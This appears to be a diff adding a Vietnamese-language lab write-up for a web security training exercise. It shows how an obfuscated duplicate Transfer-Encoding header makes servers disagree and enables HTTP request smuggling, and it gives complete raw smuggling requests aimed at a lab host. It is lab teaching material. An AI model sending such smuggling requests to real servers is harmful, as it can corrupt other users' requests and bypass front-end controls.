@@ -35,6 +35,43 @@ x
 Front-end sử dụng TE nên sẽ lấy body request từ `5a` đến hết ký tự kết thúc `0`, còn back-end sử dụng CL `Content-Length: 4` nên sẽ xử lý body request chỉ có phần `5a`. Như vậy, từ `GPOST` trở đi sẽ được coi là request kế tiếp. Khi ta submit request hai lần, request đầu tiên sẽ là POST request với body `5a`, và request thứ hai sẽ là GPOST request. Như vậy, bài lab được giải thành công.
 
 # 3. HTTP request smuggling, obfuscating the TE header
+Website có front-end và back-end server đều sử dụng Transfer-Encoding, ta sẽ thử tìm cách để một trong hai server không xử lý Transfer-Encoding đúng cách.
+
+Thử với request sau:
+```
+POST / HTTP/1.1
+Host: 0a5600960437858ac0f3db4f0041006f.web-security-academy.net
+Content-Length: 3
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+1
+G
+0
+
+
+```
+Ta thấy lỗi `Unrecognized method G0POST`, trường hợp này chỉ xảy ra với TE.CL. Như vậy, nếu có hai Transfer-Encoding thì back-end server sẽ lấy header Transfer-Encoding thứ 2(không hợp lệ) và do đó sử dụng Content-Length thay thế, dẫn đến từ TE.TE trở thành TE.CL.
+
+Ta cấu hình đoạn request sau:
+```
+POST / HTTP/1.1
+Host: 0a5600960437858ac0f3db4f0041006f.web-security-academy.net
+Content-Length: 3
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+29
+GPOST / HTTP/1.1
+Content-Length: 15
+
+x
+0
+
+
+```
+Sau khi submit request hai lần, website trả về lỗi "Unrecognized method GPOST`. Như vậy, bài lab được giải thành công.
+
 
 # 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
 
